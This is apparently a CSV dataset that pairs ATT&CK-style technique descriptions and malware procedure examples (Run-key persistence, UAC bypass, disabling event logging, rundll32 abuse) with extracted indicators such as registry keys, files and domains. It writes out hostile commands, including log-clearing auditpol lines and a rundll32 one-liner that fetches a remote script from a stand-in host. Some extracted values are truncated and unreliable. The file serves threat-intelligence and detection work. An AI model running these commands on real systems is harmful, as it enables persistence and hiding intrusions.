T1547.001,Registry Run Keys  or  Startup Folder,"The ""SCOUT"" variant of  NETEAGLE  achieves persistence by adding itself to the  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  Registry key.   [38]",Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,njRAT  has added persistence via the Registry key  HKCU\Software\Microsoft\CurrentVersion\Run\  and dropped a shortcut in  %STARTUP% .   [176]      [177],Procedure Examples,registry-key,HKCU\Software\Microsoft\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,NOKKI  has established persistence by writing the payload to the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run .   [178],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Octopus  achieved persistence by placing a malicious executable in the startup directory and has added the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  key to the Registry.   [180],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Honeybee , the threat actors used batch files that allowed them to establish persistence by adding the following Registry key:  ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v COMSysApp /t REG_MULTI_SZ /d ""COMSysApp"" /f .   [182]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Honeybee , the threat actors used batch files that allowed them to establish persistence by adding the following Registry key:  ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v COMSysApp /t REG_MULTI_SZ /d ""COMSysApp"" /f .   [182]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Sharpshooter , a first-stage downloader installed  Rising Sun  to  %Startup%\mssync.exe  on a compromised host.   [183]",Procedure Examples,file,mssync.exe
T1547.001,Registry Run Keys  or  Startup Folder,PowerSploit 's  New-UserPersistenceOption  Persistence argument can be used to establish via the  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  Registry key.   [195]      [196],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,A dropper used by  Putter Panda  installs itself into the ASEP Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  with a value named McUpdate.   [204],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,If the  QuasarRAT  client process does not have administrator privileges it will add a registry key to  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [209]      [210],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Remcos  can add itself to the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [215],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Revenge RAT  creates a Registry key at  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  to survive a system reboot.   [217],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
T1547.001,Registry Run Keys  or  Startup Folder,Revenge RAT  creates a Registry key at  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  to survive a system reboot.   [217],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,Rifdoor  has created a new registry entry at  HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics  with a value of  C:\ProgramData\Initech\Initech.exe /run .   [218],Procedure Examples,path,C:\ProgramData\Initech\Initech.exe
T1547.001,Registry Run Keys  or  Startup Folder,Rifdoor  has created a new registry entry at  HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics  with a value of  C:\ProgramData\Initech\Initech.exe /run .   [218],Procedure Examples,file,Initech.exe
T1547.001,Registry Run Keys  or  Startup Folder,Rover  persists by creating a Registry entry in  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ .   [221],Procedure Examples,registry-key,HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Ryuk  has used the Windows command line to create a Registry entry under  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  to establish persistence.   [224],Procedure Examples,registry-key,HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,S-Type  may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier} .   [225],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Seasalt  creates a Registry entry to ensure infection after reboot under  HKLM\Software\Microsoft\Windows\currentVersion\Run .   [232],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\currentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,ServHelper  may attempt to establish persistence via the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\  run key.   [233],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,ShimRat  has installed a registry based start-up key  HKCU\Software\microsoft\windows\CurrentVersion\Run  to maintain persistence should other methods fail.   [234],Procedure Examples,registry-key,HKCU\Software\microsoft\windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Silence  has used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run ,  HKLM\Software\Microsoft\Windows\CurrentVersion\Run , and the Startup folder to establish persistence.   [238]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Silence  has used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run ,  HKLM\Software\Microsoft\Windows\CurrentVersion\Run , and the Startup folder to establish persistence.   [238]",Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Small Sieve  has the ability to add itself to  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift  for persistence.   [240],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift
T1547.001,Registry Run Keys  or  Startup Folder,SMOKEDHAM  has used  reg.exe  to create a Registry Run key.   [242],Procedure Examples,file,reg.exe
T1547.001,Registry Run Keys  or  Startup Folder,"STARWHALE  can establish persistence by installing itself in the startup folder, whereas the GO variant has created a  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM  registry key.   [245]      [246]",Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM
T1547.001,Registry Run Keys  or  Startup Folder,StrongPity  can use the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  Registry key for persistence.   [199],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Taidoor  has modified the  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  key for persistence.   [249],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"TAINTEDSCRIBE  can copy itself into the current user’s Startup folder as ""Narrator.exe"" for persistence.   [250]",Procedure Examples,file,Narrator.exe
T1547.001,Registry Run Keys  or  Startup Folder,"A  Turla  Javascript backdoor added a local_update_check value under the Registry key  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  to establish persistence. Additionally, a  Turla  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.   [161]      [261]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,VBShower  used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[a-f0-9A-F]{8}  to maintain persistence.   [267],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,WarzoneRAT  can add itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK  Registry keys.   [268],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,WarzoneRAT  can add itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK  Registry keys.   [268],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK
T1547.001,Registry Run Keys  or  Startup Folder,Wizard Spider  has established persistence via the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and a shortcut within the startup folder.   [271]      [272],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1036.003,Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.    [1]    It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename  rundll32.exe ).    [2]    An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.    [3],Description,file,rundll32.exe
T1036.003,Rename System Utilities,The  CozyCar  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.   [3],Procedure Examples,file,rundll32.exe
T1036.003,Rename System Utilities,GALLIUM  used a renamed cmd.exe file to evade detection.   [5],Procedure Examples,file,cmd.exe
T1036.003,Rename System Utilities,Kevin  has renamed an image of  cmd.exe  with a random name followed by a  .tmpl  extension.   [6],Procedure Examples,file,cmd.exe
T1036.003,Rename System Utilities,Lazarus Group  has renamed system utilities such as  wscript.exe  and  mshta.exe .   [7],Procedure Examples,file,wscript.exe
T1036.003,Rename System Utilities,Lazarus Group  has renamed system utilities such as  wscript.exe  and  mshta.exe .   [7],Procedure Examples,file,mshta.exe
T1071.004,DNS,OilRig  has used DNS for C2 including the publicly available  requestbin.net  tunneling service.   [44]      [45]      [46]      [47],Procedure Examples,domain,requestbin.net
T1027,Obfuscated Files or Information,"Emotet  has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts.    [120]      [121]      [122]      [123]",Procedure Examples,file,CMD.exe
T1027,Obfuscated Files or Information,ISMInjector  is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.   [194],Procedure Examples,domain,red-gate.com
T1027,Obfuscated Files or Information,NanoCore ’s plugins were obfuscated with Eazfuscater.NET 3.3.   [260],Procedure Examples,domain,eazfuscater.net
T1027,Obfuscated Files or Information,SUNSPOT  encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for  SUNBURST  source code and data extracted from the SolarWinds Orion &lt;MsBuild.exe process.   [361],Procedure Examples,file,MsBuild.exe
T1562.002,Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.   [1]    This data is used by security tools and analysts to generate detections.   The EventLog service maintains event logs from various system components and applications.   [2]    By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to  Security Settings\Local Policies\Audit Policy  for basic audit policy settings or  Security Settings\Advanced Audit Policy Configuration  for advanced audit policy settings.   [3]      [4]     auditpol.exe  may also be used to set audit policies.   [5]      Adversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line:  Stop-Service -Name EventLog .   [6]    Additionally, adversaries may use  auditpol  and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the  /success  or  /failure  parameters. For example,  auditpol /set /category:""Account Logon"" /success:disable /failure:disable  turns off auditing for the Account Logon category.   [7]      [8]    To clear the audit policy, adversaries may run the following lines:  auditpol /clear /y  or  auditpol /remove /allusers .   [8]      By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",Description,file,auditpol.exe
T1562.002,Disable Windows Event Logging,Threat Group-3390  has used appcmd.exe to disable logging on a victim server.   [11],Procedure Examples,file,appcmd.exe
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\mscfile\shell\open\command
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\ms
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\ms-settings\shell\open\command
T1548.002,Bypass User Account Control,Clambling  has the ability to bypass UAC using a  passuac.dll  file.   [20]      [21],Procedure Examples,file,passuac.dll
T1548.002,Bypass User Account Control,H1N1  bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).   [34],Procedure Examples,file,wusa.exe
T1548.002,Bypass User Account Control,Koadic  has 2 methods for elevating integrity. It can bypass UAC through  eventvwr.exe  and  sdclt.exe .   [37],Procedure Examples,file,eventvwr.exe
T1548.002,Bypass User Account Control,Koadic  has 2 methods for elevating integrity. It can bypass UAC through  eventvwr.exe  and  sdclt.exe .   [37],Procedure Examples,file,sdclt.exe
T1548.002,Bypass User Account Control,KOCTOPUS  will perform UAC bypass either through fodhelper.exe or eventvwr.exe.   [38],Procedure Examples,file,fodhelper.exe
T1548.002,Bypass User Account Control,KOCTOPUS  will perform UAC bypass either through fodhelper.exe or eventvwr.exe.   [38],Procedure Examples,file,eventvwr.exe
T1548.002,Bypass User Account Control,"During  Operation Honeybee , the threat actors used the malicious NTWDBLIB.DLL and  cliconfig.exe  to bypass UAC protections.   [43]",Procedure Examples,file,cliconfig.exe
T1548.002,Bypass User Account Control,Saint Bot  has attempted to bypass UAC using  fodhelper.exe  to escalate privileges.   [54],Procedure Examples,file,fodhelper.exe
T1548.002,Bypass User Account Control,ShimRat  has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.   [57],Procedure Examples,file,cryptbase.dll
T1548.002,Bypass User Account Control,ShimRat  has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.   [57],Procedure Examples,file,migwiz.exe
T1548.002,Bypass User Account Control,WarzoneRAT  can use  sdclt.exe  to bypass UAC in Windows 10 to escalate privileges; for older Windows versions  WarzoneRAT  can use the IFileOperation exploit to bypass the UAC module.   [60]      [61],Procedure Examples,file,sdclt.exe
T1548.002,Bypass User Account Control,Many  ZeroT  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.   [64],Procedure Examples,file,eventvwr.exe
T1087.001,Local Account,Milan  has run  C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1  to discover local accounts.   [23],Procedure Examples,path,C:\Windows\system32\cmd.exe
T1087.001,Local Account,Milan  has run  C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1  to discover local accounts.   [23],Procedure Examples,file,cmd.exe
T1087.001,Local Account,Mis-Type  may create a file containing the results of the command  cmd.exe /c net user {Username} .   [24],Procedure Examples,file,cmd.exe
T1087.001,Local Account,SMOKEDHAM  has used  net.exe user  and  net.exe users  to enumerate local accounts on a compromised host.   [42],Procedure Examples,file,net.exe
T1087.001,Local Account,SoreFang  can collect usernames from the local system via  net.exe user .   [43],Procedure Examples,file,net.exe
T1546.009,AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppCertDLLs  Registry key under  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\  are loaded into every process that calls the ubiquitously used application programming interface (API) functions  CreateProcess ,  CreateProcessAsUser ,  CreateProcessWithLoginW ,  CreateProcessWithTokenW , or  WinExec .    [1]      Similar to  Process Injection , this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",Description,registry-key,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
T1555,Credentials from Password Stores,"PinchDuke  steals credentials from compromised hosts.  PinchDuke 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  PinchDuke  include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.   [8]",Procedure Examples,domain,passport.net
T1555,Credentials from Password Stores,"PinchDuke  steals credentials from compromised hosts.  PinchDuke 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  PinchDuke  include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.   [8]",Procedure Examples,domain,mail.ru
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,url,https://www.example.com/malicious.sct
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,domain,www.example.com
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,rundll32.exe
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,Rundll32.exe
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,shell32.dll
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,ExampleDLL.dll
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,file.dll
T1218.011,Rundll32,ADVSTORESHELL  has used rundll32.exe in a Registry value to establish persistence.   [6],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,APT19  configured its payload to inject into the rundll32.exe.   [7],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,path,C:\Windows\twain_64.dll
